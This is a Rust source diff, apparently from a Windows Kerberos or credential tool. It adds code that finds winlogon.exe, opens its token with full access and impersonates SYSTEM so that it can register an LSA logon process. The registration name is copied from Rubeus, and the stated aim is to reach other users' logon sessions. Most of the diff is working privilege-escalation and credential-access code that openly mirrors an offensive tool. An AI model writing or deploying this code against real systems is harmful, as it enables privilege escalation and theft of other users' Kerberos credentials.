@@ -32,26 +32,100 @@ pub fn lsa_handle() -> Result<isize> {
 pub fn lsa_handle_with_priv() -> Result<(isize, bool)> {
     use std::mem::zeroed;
     unsafe {
-        // Try privileged path first — needed to query other users' sessions
-        let name_bytes = b"hagrid\0";
+        // "User32LogonProcesss" — same name used by Rubeus (intentional 3 s's)
+        let name_bytes = b"User32LogonProcesss\0";
         let reg_name = LSA_STRING {
-            Length: 6,
-            MaximumLength: 7,
+            Length: 19,
+            MaximumLength: 20,
             Buffer: PSTR(name_bytes.as_ptr() as *mut u8),
         };
         let mut handle: HANDLE = zeroed();
         let mut sec_mode: u32 = 0;
+
+        // 1. Try direct — works if already SYSTEM or SeTcbPrivilege is active
         let status = LsaRegisterLogonProcess(&reg_name, &mut handle, &mut sec_mode);
         if status.0 == 0 {
             return Ok((handle.0 as isize, true));
         }
-        // Fall back to unprivileged — can only see current session
-        let status = LsaConnectUntrusted(&mut handle);
-        if status.0 != 0 {
-            bail!("LsaConnectUntrusted failed: NTSTATUS 0x{:08x}", status.0);
+
+        // 2. Try via SYSTEM token impersonation (needs SeDebugPrivilege + SeImpersonatePrivilege)
+        let impersonated = impersonate_system_token();
+        if impersonated {
+            let status2 = LsaRegisterLogonProcess(&reg_name, &mut handle, &mut sec_mode);
+            revert_to_self();
+            if status2.0 == 0 {
+                return Ok((handle.0 as isize, true));
+            }
+        }
+
+        // 3. Fall back to unprivileged — can only see current session
+        let status3 = LsaConnectUntrusted(&mut handle);
+        if status3.0 != 0 {
+            bail!("LsaConnectUntrusted failed: NTSTATUS 0x{:08x}", status3.0);
         }
         Ok((handle.0 as isize, false))
     }
+}
+
+/// Mirror of Rubeus Helpers.GetSystem():
+/// find winlogon.exe, open its token, impersonate directly (no DuplicateTokenEx).
+/// Requires SeDebugPrivilege + SeImpersonatePrivilege.
+#[cfg(windows)]
+unsafe fn impersonate_system_token() -> bool {
+    use windows::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+    };
+    use windows::Win32::System::Threading::{OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION};
+    use windows::Win32::Security::{ImpersonateLoggedOnUser, TOKEN_ALL_ACCESS};
+    use windows::Win32::Foundation::CloseHandle;
+    use std::mem::zeroed;
+
+    let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) else {
+        return false;
+    };
+
+    let mut entry: PROCESSENTRY32W = zeroed();
+    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+
+    // Rubeus specifically targets winlogon.exe (Process.GetProcessesByName("winlogon"))
+    let mut winlogon_pid = 0u32;
+    if Process32FirstW(snap, &mut entry).is_ok() {
+        loop {
+            let end = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
+            let name = String::from_utf16_lossy(&entry.szExeFile[..end]).to_ascii_lowercase();
+            if name == "winlogon.exe" {
+                winlogon_pid = entry.th32ProcessID;
+                break;
+            }
+            if Process32NextW(snap, &mut entry).is_err() { break; }
+        }
+    }
+    let _ = CloseHandle(snap);
+    if winlogon_pid == 0 { return false; }
+
+    let Ok(proc) = OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogon_pid) else {
+        return false;
+    };
+
+    // Rubeus: OpenProcessToken with TOKEN_ALL_ACCESS, then ImpersonateLoggedOnUser directly
+    // (no DuplicateTokenEx — passes the primary token straight to impersonation)
+    let mut token: HANDLE = zeroed();
+    if OpenProcessToken(proc, TOKEN_ALL_ACCESS, &mut token).is_err() {
+        let _ = CloseHandle(proc);
+        return false;
+    }
+    let _ = CloseHandle(proc);
+
+    let result = ImpersonateLoggedOnUser(token).is_ok();
+    let _ = CloseHandle(token);
+    result
+}
+
+#[cfg(windows)]
+unsafe fn revert_to_self() {
+    use windows::Win32::Security::RevertToSelf;
+    let _ = RevertToSelf();
 }
 
 #[cfg(windows)]
